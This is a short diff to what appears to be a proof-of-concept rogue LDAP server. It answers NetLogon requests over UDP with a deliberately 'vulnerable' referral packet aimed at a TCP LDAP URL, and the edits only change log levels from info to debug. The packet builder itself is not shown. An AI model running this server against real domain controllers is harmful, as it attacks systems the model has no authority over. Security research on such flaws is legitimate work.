@@ -54,12 +54,12 @@ def answer_request_with_referral(data: bytes, addr, sock: socket.socket, tcp_lda
 
     # Parse the received data
     ldap_message, _ = pureber.berDecodeObject(berdecoder, data)
-    logger.info(f"Received LDAP request from NetLogon {addr}")
+    logger.debug(f"Received LDAP request from NetLogon {addr}")
 
     # Build the "vulnerable" response packet
     referral_ldap_packet = get_referral_to_tcp_server_ldap_packet(ldap_message.id, tcp_ldap_url=tcp_ldap_url)
 
-    logger.info(f"Sending LDAP referral response packet to {addr}: {referral_ldap_packet}")
+    logger.debug(f"Sending LDAP referral response packet to {addr}: {referral_ldap_packet}")
     # Send back to client
     sock.sendto(referral_ldap_packet, addr)
 
@@ -67,13 +67,13 @@ def answer_request_with_referral(data: bytes, addr, sock: socket.socket, tcp_lda
 def run_server(listen_port: int, tcp_ldap_url: str):
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     sock.bind(('0.0.0.0', listen_port))
-    logger.info(f"Server listening on port {listen_port}")
+    logger.debug(f"Server listening on port {listen_port}")
 
     try:
         while True:
             data, addr = sock.recvfrom(4096)
             answer_request_with_referral(data, addr, sock, tcp_ldap_url)
     except KeyboardInterrupt:
-        logger.info("Server has been shut down.")
+        logger.debug("Server has been shut down.")
     finally:
         sock.close()
